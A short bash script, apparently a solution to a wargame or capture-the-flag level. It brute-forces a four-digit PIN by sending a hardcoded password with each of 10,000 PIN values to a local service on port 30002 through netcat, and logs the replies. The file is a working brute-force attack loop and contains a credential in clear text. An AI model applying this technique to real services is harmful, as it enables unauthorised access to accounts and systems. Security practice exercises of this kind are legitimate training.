#!/bin/bash

password="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {0000..9999}
do
    echo "$password $i" | nc localhost 30002 >>  /tmp/dikkin/log.txt
done;
echo "done"
